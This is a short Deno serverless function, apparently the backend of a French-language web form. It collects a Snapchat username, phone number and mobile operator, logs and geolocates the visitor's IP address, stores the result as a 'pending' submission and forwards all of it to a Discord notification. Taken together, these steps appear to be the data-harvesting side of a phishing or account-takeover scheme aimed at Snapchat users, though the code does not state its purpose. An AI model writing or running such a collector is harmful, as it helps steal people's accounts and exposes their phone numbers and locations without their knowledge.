import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const { snapchat, telephone, operateur } = await req.json();

    if (!snapchat || !telephone || !operateur) {
      return Response.json({ error: 'Données manquantes' }, { status: 400 });
    }

    // Extract client IP directly from request headers (not via separate function call)
    let ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
             req.headers.get('x-real-ip') ||
             req.headers.get('cf-connecting-ip') ||
             req.headers.get('x-client-ip') ||
             'unknown';
    
    ip = ip.trim();

    // Geolocate the IP
    let country = 'France';
    let city = 'Inconnue';

    try {
      const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      if (geoResponse.ok) {
        const geoData = await geoResponse.json();
        country = geoData.country_name || 'France';
        city = geoData.city || 'Inconnue';
      }
    } catch (geoError) {
      console.error('Geolocation error:', geoError.message);
    }

    // Create submission
    const submission = await base44.asServiceRole.entities.Submission.create({
      snapchat,
      telephone,
      operateur,
      status: 'pending',
      ip_address: ip,
      country: country,
      browser: 'unknown'
    });

    // Send Discord notification
    await base44.functions.invoke('notifyDiscord', {
      snapchat,
      telephone,
      operateur,
      submissionId: submission.id,
      ip,
      country,
      city
    }).catch(() => {});

    return Response.json({ ok: true, submissionId: submission.id });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});